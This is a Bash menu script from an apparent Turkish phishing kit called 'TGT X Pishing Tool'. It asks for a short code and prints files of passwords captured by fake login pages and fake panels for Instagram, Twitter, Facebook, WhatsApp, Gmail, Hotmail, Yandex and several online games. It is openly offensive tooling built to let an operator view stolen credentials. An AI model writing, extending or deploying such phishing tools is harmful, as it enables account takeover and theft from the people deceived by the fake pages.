#!/bin/bash
clear
echo -e  "\e[31m


 _____________________   __   __
\e[31m|__   __/ __ _|__   __|  \ \ / /
\e[32m   | | | |  __   | |      \ V / 
 \e[33m  | | | | |_ |  | |       > <  \e[ \e[37m Code Menu
\e[34m   | | | |__| |  | |      / . \ 
\e[35m   |_|  \_____|  |_|     /_/ \_\
   
  \e[31m=============================                          
  \e[36m                                             İletişim && Sosyal Medya
  \e[31m                                          ###############################
      \e[37m      Coder:  Alyx   	            \e[31m| Youtube:  ♛\e[32m Turkish Guy Tim\e[31m ♛
   \e[31m     /♛ Turkish Guy Tim ♛\               \e[31m| Web Site: ♛\e[32m Turkish Guy Tim\e[31m ♛
                                            \e[31m| Discord:  ♛\e[32m  .gg/e8ruugKW\e[31m   ♛
      \e[33m TGT X Pishing Tool V1.0  \e[31m  	    ###############################

""\e[31m==========================================================================="
echo -e "|\e[37m Ana Menüye Dönmek İçin Q Yazın"
echo -e "\e[31m"
read -p "| Kayıtlı Şifreleri Görmek İçin Kodunuzu Girin: " islem

if [[ $islem == "insta01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor.."
sleep 2
echo -e "\e[37m"
cat "Instagram/Instagram-phishing/username-phishing.txt"

elif [[ $islem == "insta02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor..."
sleep 2
echo -e "\e[37m"
cat "Instagram/Instagram-fakepanel/username-fakepanel.txt"

elif [[ $islem == "insta04" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor..."
sleep 2
echo -e "\e[37m"
cat "Instagram/instafollowers/usernames.txt"

elif [[ $islem == "twitter01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor...."
sleep 2
echo -e "\e[37m"
cat "Twitter/Site-phishing/user.txt"

elif [[ $islem == "twitter02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor."
sleep 2
echo -e "\e[37m"
cat "Twitter/Site-fakepanel/twitter.txt"

elif [[ $islem == "whatsapp" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor.."
echo -e "\e[37m"
cat "Whatsapp/Site/code.txt"

elif [[ $islem == "face01" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor..."
sleep 2
echo -e "\e[37m"
cat "Facebook/Site-facebook/facebook.txt"

elif [[ $islem == "face02" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor...."
sleep 2
echo -e "\e[37m"
cat "Facebook/Site-fakepanel/fakepanel.txt"
elif [[ $islem == "gmail" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor."
sleep 2
echo -e "\e[37m"
cat "Mail/Site-gmail/gmail.txt"

elif [[ $islem == "hotmail" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor.."
sleep 2
echo -e "\e[37m"
cat "Mail/Site-yandex/yandex.txt"

elif [[ $islem == "yandex" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor..."
sleep 2
echo -e "\e[37m"
cat "Mail/Site-hotmail/hotmail.txt"

elif [[ $islem == "wolfteam" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor...."
sleep 2
echo -e "\e[37m"
cat "Game/Site-wolfteam/wolfteam.txt"

elif [[ $islem == "legend" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor."
sleep 2
echo -e "\e[37m"
cat "Game/Site-legend/legendonline.txt"

elif [[ $islem == "pubg" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor.."
sleep 2
echo -e "\e[37m"
cat "Game/Site-pubg/pubg.txt"

elif [[ $islem == "zula" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor..."
sleep 2
echo -e "\e[37m"
cat "Game/Site-zula/zula.txt"

elif [[ $islem == "lol" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor...."
sleep 2
echo -e "\e[37m"
cat "Game/Site-lol/lol.txt"

elif [[ $islem == "firmware" ]]; then
sleep 1
echo ""
echo -e "\e[33mVeriler Yükleniyor...."
sleep 2
echo -e "\e[37m"
cat "Others/Site-firmware/firmware.txt"

elif [[ $islem == "Q" || $islem == "q" ]]; then
cd ..
bash tgtx.sh

else
	clear
        echo -e "\e[31mYanlış Kod Girdiniz Lütfen Tekrar Deneyin...."
	sleep 3
        bash code.sh
fi
echo -e "\e[37m"
read -p "Ana Menüye Dönmek İçin Entere Basınız...." non
cd ..
bash tgtx.sh
